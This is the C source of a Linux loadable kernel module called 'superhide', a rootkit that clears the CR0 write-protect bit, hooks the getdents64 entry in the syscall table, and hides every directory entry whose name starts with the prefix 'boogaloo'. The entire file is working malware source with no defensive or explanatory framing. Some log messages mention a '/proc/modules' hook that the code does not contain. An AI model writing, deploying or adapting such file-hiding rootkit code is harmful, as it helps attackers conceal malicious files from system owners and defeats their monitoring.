#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <asm/special_insns.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fs.h>
#include "sysgen.h"

#define GETDENTS_SYSCALL_NUM	__NR_getdents64
#define MODULE_NAME		"superhide"
#define MODULE_NAME_SZ		(sizeof(MODULE_NAME) - 1)
#define PREFIX			"boogaloo"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Parse Hosseini");

extern unsigned long __force_order;
inline void mywrite_cr0(unsigned long cr0) {
	asm volatile("mov %0,%%cr0" :  "+r"(cr0),"+m"(__force_order));
}

void enable_write_protection(void) {
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	mywrite_cr0(cr0);
}

void disable_write_protection(void) {
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	mywrite_cr0(cr0);
}


typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static sys_getdents_t sys_getdents_orig = NULL;

asmlinkage int sys_getdents64_new(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
    long error;
    /* Declare the previous_dir struct for book-keeping */
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    int ret = sys_getdents_orig(fd, dirent, count);

    dirent_ker = kvzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            /* Check for the special case when we need to hide the first entry */
            if( current_dir == dirent_ker )
            {
                /* Decrement ret and shift all the structs up in memory */
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* Hide the secret entry by incrementing d_reclen of previous_dir by
             * that of the entry we want to hide - effectively "swallowing" it
             */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* Set previous_dir to current_dir before looping where current_dir
             * gets incremented to the next entry
             */
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if(error)
        goto done;

done:
    kvfree(dirent_ker);
    return ret;
}


// runs on insmod
static int __init lkm_init_module(void) {
	printk(KERN_INFO "superhide loaded\n");

	printk(KERN_INFO "syscall_table @ %p\n", syscall_table);
	
	// record the original getdents handler
	sys_getdents_orig = (sys_getdents_t) syscall_table[GETDENTS_SYSCALL_NUM];
	
	printk(KERN_INFO "original sys_getdents @ %p\n", sys_getdents_orig);

	// turn write protect off
	/*native_write_cr0(native_read_cr0() & (0b11111111111111101111111111111111));
	struct page *page_ptr;
	printk(KERN_INFO "page1\n");
	page_ptr = virt_to_page(syscall_table);
	printk(KERN_INFO "page2\n");
	pages_rw(page_ptr, 1);
	printk(KERN_INFO "page3\n");*/
	disable_write_protection();
	
	// add our new handlers
	printk(KERN_INFO "Hooking...\n");
	syscall_table[GETDENTS_SYSCALL_NUM] = (unsigned long)sys_getdents64_new;

	// turn write protect back on
	//pages_ro(page_ptr, 1);
	//write_cr0(read_cr0() | 0x10000);
	enable_write_protection();

	printk(KERN_INFO "New syscall in place\n");
	printk(KERN_INFO "New proc/modules read in place\n");

	

	return 0;
}

// runs on rmmod
static void __exit lkm_cleanup_module(void) {
	printk(KERN_INFO "superhide leaving\n");
	
	// allow us to write to read onlu pages
	/*write_cr0(read_cr0() & (~0x10000));
	struct page *page_ptr = virt_to_page(&syscall_table);
	pages_rw(page_ptr, 1);*/
	disable_write_protection();

	// set getdents handler back
	syscall_table[GETDENTS_SYSCALL_NUM] = (unsigned long)sys_getdents_orig;

	// turn write protect back on
	//pages_ro(page_ptr, 1);
	//write_cr0(read_cr0() | 0x10000);
	enable_write_protection();

	printk(KERN_INFO "Old syscall back\n");
	printk(KERN_INFO "Old proc/modules read back\n");
}

// register the init and exit functions
module_init(lkm_init_module);
module_exit(lkm_cleanup_module);

